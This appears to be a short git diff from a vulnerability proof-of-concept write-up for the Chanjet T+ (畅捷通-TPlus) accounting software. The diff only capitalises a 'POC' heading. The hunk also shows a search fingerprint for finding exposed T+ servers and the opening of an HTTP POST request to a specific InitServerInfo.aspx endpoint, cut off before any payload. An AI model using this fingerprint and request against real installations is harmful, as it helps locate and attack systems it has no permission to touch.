@@ -5,7 +5,7 @@
 app="畅捷通-TPlus"
 ```
 
-## poc
+## POC
 ```
 POST /tplus/UFAQD/InitServerInfo.aspx?preload=1 HTTP/1.1
 Host: 
